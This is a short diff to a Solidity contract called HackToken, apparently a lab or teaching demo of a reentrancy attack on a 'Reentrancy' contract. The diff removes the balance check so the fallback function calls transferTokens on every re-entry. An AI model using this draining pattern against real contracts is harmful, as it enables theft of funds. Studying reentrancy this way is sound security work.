@@ -7,6 +7,7 @@ import "./Reentrancy.sol";
 /// @dev A contract that pull in all the tokens from the Reentrancy contract
 contract HackToken {
     Reentrant public rentrancyAddress;
+    uint256 public contractBalance = address(this).balance;
 
     /// @dev constructor that sets the Reentrancy contract address
     constructor (address rentrancyContractAddress) public {
@@ -25,9 +26,7 @@ contract HackToken {
 
     /// @dev Function that pulls in tokens from
     function() external payable { 
-        if (rentrancyAddress.balance > 0 ) {
-            rentrancyAddress.transferTokens(1 ether);
-        }
+        rentrancyAddress.transferTokens(1 ether);
     }
 }
 
